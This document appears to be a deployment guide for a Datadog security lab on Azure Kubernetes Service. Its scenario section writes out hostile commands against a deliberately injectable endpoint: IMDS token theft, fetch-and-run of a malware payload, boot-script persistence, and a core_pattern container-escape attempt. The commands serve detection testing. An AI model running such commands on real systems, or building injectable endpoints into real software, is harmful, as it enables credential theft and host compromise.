# Azure Kubernetes Service (AKS) Setup

This guide covers deploying the Datadog Security Playground on Azure Kubernetes Service using the Terraform module in `terraform/aks/`.

## Prerequisites

- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) installed and authenticated (`az login`)
- An active Azure subscription with **Contributor or Owner** role — Terraform needs to create resource groups, VNets, AKS clusters, managed identities, and federated credentials
- [Terraform](https://developer.hashicorp.com/terraform/install) >= 1.3
- [kubectl](https://kubernetes.io/docs/tasks/tools/) and [Helm](https://helm.sh/docs/intro/install/) installed
- Python 3 (pre-installed on most systems) — used for URL-encoding scenario commands
- A Datadog API key

### Azure quota check

The default configuration uses **2 × Standard_D2s_v3** nodes (4 vCPUs total). Verify your quota in the target region before deploying:

```bash
az vm list-usage --location westeurope --query "[?name.value=='standardDSv3Family']" -o table
```

If the `CurrentValue` is close to `Limit`, either choose a region with headroom or request a quota increase in the Azure portal.

### Cost estimate

> **Running this cluster costs approximately $0.50/hour (~$12/day).** Remember to run `terraform destroy` or `make aks-destroy` when you are done to avoid unexpected charges.

| Resource | Approx. hourly cost |
|---|---|
| 2 × Standard_D2s_v3 nodes | ~$0.38 |
| AKS cluster management fee | ~$0.10 |
| Standard Load Balancer | ~$0.02 |
| **Total** | **~$0.50/hr** |

## Authenticate with Azure

```bash
az login
az account set --subscription "<your-subscription-id>"
```

## API key — store it safely

Create a `terraform.tfvars` file in `terraform/aks/` before running any Terraform commands.
This keeps the key out of your shell history and out of `terraform plan` output:

```bash
cat > terraform/aks/terraform.tfvars << 'EOF'
datadog_api_key = "YOUR_DATADOG_API_KEY"
EOF
chmod 0600 terraform/aks/terraform.tfvars
```

Terraform automatically reads `terraform.tfvars` in the working directory — no `-var` flags needed on any command below.

## Deployment

Due to Terraform provider initialization requirements, deployment is done in two stages. Stage 1 provisions the Azure infrastructure first; Stage 2 then uses the live cluster endpoint to deploy Kubernetes resources. Running `terraform apply` in a single pass would fail because the Kubernetes and Helm providers cannot connect until the cluster exists.

### Stage 1: Create the AKS Cluster and Networking

```bash
cd terraform/aks
terraform init
terraform apply \
    -target=azurerm_resource_group.playground \
    -target=azurerm_virtual_network.playground \
    -target=azurerm_subnet.aks \
    -target=azurerm_user_assigned_identity.playground \
    -target=azurerm_kubernetes_cluster.playground \
    -target=azurerm_kubernetes_cluster_node_pool.user \
    -target=azurerm_federated_identity_credential.playground
```

This creates:
- Azure Resource Group
- Virtual Network and subnet (VNet: `10.0.0.0/16`, service CIDR: `10.96.0.0/16`)
- AKS cluster with system and user node pools (OIDC issuer + Workload Identity enabled)
- User-assigned managed identity with federated credential for the playground service account

Allow 5–10 minutes for the AKS cluster to become ready.

### Stage 2: Deploy Kubernetes Resources

Once the cluster is ready, deploy the Kubernetes resources:

```bash
terraform apply
```

This deploys:
- Kubernetes namespaces (`playground` and `datadog`)
- Service accounts annotated for Azure Workload Identity
- Datadog Agent via Helm
- Playground application

## Access the Cluster

```bash
az aks get-credentials \
    --resource-group $(terraform output -raw resource_group_name) \
    --name $(terraform output -raw cluster_name)
```

Or use the convenience Makefile target from the repo root:

```bash
make aks-creds
```

## Variables

| Variable | Default | Description |
|---|---|---|
| `location` | `westeurope` | Azure region |
| `resource_group_name` | `datadog-security-playground` | Resource group name |
| `cluster_name` | `security-playground` | AKS cluster name |
| `node_count` | `1` | Nodes per pool |
| `vm_size` | `Standard_D2s_v3` | Node VM size |
| `kubernetes_version` | `1.34` | Kubernetes version (1.31 and below require Premium/LTS tier in some regions) |
| `playground_namespace` | `playground` | App namespace |
| `datadog_namespace` | `datadog` | Datadog agent namespace |
| `datadog_cluster_name` | `playground-cluster-aks` | Cluster name tag in Datadog (distinct from EKS deployments) |
| `datadog_api_key` | — | **Required** — your Datadog API key (store in `terraform.tfvars`, not on the CLI) |
| `datadog_site` | `datadoghq.com` | Your Datadog site |

Override any variable by adding it to `terraform.tfvars`:

```hcl
datadog_api_key = "YOUR_KEY"
location        = "eastus"
vm_size         = "Standard_D4s_v3"
```

## Running security scenarios on AKS

All scenarios inject shell commands into the running playground container via its `/inject` HTTP endpoint.
Open a port-forward first and leave it running for all scenarios:

```bash
kubectl port-forward -n playground deploy/playground-app 5000:5000 &
```

Use this shell helper to URL-encode and send commands:

```bash
inject() {
  local cmd="$1"
  local encoded
  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$cmd")
  curl -s "http://localhost:5000/inject?cmd=${encoded}"
}
```

### cloud-access-azure (Azure IMDS token theft)

The `scenarios/cloud-access-azure/` scenario demonstrates Azure managed identity token theft via IMDS. Because the playground container image is built from a specific git SHA (set at build time), the scenario script is copied into the pod from the local checkout rather than fetched from GitHub:

```bash
# Copy the script into the running pod and execute it
kubectl cp assets/cloud-access-azure/cloud-access-azure.sh \
  playground/$(kubectl get pod -n playground -l app=playground-app -o jsonpath='{.items[0].metadata.name}'):/tmp/cloud-access-azure.sh \
  -c playground-app

kubectl exec -n playground deploy/playground-app -- sh -c \
  "chmod +x /tmp/cloud-access-azure.sh && cd /tmp && ./cloud-access-azure.sh"
```

Expected signals in Datadog Workload Protection:
- **Cloud credentials accessed by network utility** (`azure_imds` rule, Medium) — fired by the `curl` call to the IMDS token endpoint
- **Network utility executed in container** (`net_util_in_container` rule, Medium)
- Azure Activity Log records the failed `Microsoft.Compute/virtualMachines/write` calls across 8 regions

### bpfdoor (rootkit persistence)

Simulates a BPFDoor-style backdoor: downloads a fake binary, marks it executable, modifies `/etc/rc.common` for boot persistence, and daemonizes.

```bash
inject "apt-get update -qq && apt-get install -y -qq curl"
inject "curl -fsSL https://github.com/DataDog/datadog-security-playground/raw/main/assets/bpfdoor/fake-bpfdoor.x64 -o ./fake-bpfdoor.x64"
inject "chmod +x ./fake-bpfdoor.x64"
inject "echo './fake-bpfdoor.x64 &' >> /etc/rc.common"
inject "./fake-bpfdoor.x64 &"
```

Expected signals:
- **RC scripts modified** (`rc_scripts_modified` rule, Medium)
- **Network utility executed in container** (`net_util_in_container` rule, Medium)

### rce-malware (payload download and execution)

Downloads a payload script that fetches a known-malware binary and a preload library, sets the executable bit, and runs the binary.

```bash
inject "apt-get update -qq && apt-get install -y -qq curl"
inject "curl -fsSL https://github.com/DataDog/datadog-security-playground/raw/main/assets/rce-malware/payload.sh -o /app/payload.sh"
inject "chmod +x /app/payload.sh"
inject "/app/payload.sh"
```

Expected signals:
- **Package installed in container** (`package_management_in_container` rule, Medium)
- **Executable bit added to newly created file** (`executable_bit_added` rule, Low)
- **Hash of known malware detected** (Critical) — Datadog threat intel matches the payload binary hash
- **Dynamic linker hijacking attempt** (`ld_preload_unusual_library_path` rule, Medium) — detects the preload library
- **Cryptomining attack chain detected** (High) — correlation rule fires when miner execution, pool connection, and persistence are all observed together

### coredump-escape-container (CVE-2022-0492 style)

Attempts to register a malicious coredump pipe handler via `/proc/sys/kernel/core_pattern`, then triggers a SIGSEGV.

> **AKS limitation:** On AKS, `/proc/sys/kernel/core_pattern` is read-only inside the container (`Read-only file system`). The write attempt is blocked before any kernel event fires, so no Datadog Workload Protection signal is generated for this scenario on AKS. The scenario works as expected on self-managed Kubernetes or EKS where the sysctl is writable.

```bash
inject "echo '|/tmp/escape.sh' > /proc/sys/kernel/core_pattern || echo 'blocked: read-only (expected on AKS)'"
inject "kill -SIGSEGV $$"
```

## Azure Workload Identity vs EKS Pod Identity

The AKS module uses [Azure Workload Identity](https://azure.github.io/azure-workload-identity/docs/) instead of EKS Pod Identity. The key differences:

| | EKS | AKS |
|---|---|---|
| Mechanism | Pod Identity Association + IRSA | Federated OIDC credential |
| Service account annotation | `eks.amazonaws.com/role-arn` | `azure.workload.identity/client-id` |
| Pod label required | No | `azure.workload.identity/use: "true"` |
| IAM primitive | AWS IAM Role | Azure User-Assigned Managed Identity |

The `cloud-access-azure` scenario demonstrates token theft via the Azure IMDS endpoint, which is the AKS equivalent of the AWS `cloud-access` scenario.

## Cleanup

> Destroy the cluster as soon as you are done to stop incurring charges.

```bash
cd terraform/aks
terraform destroy
```

Or from the repo root:

```bash
make aks-destroy
```
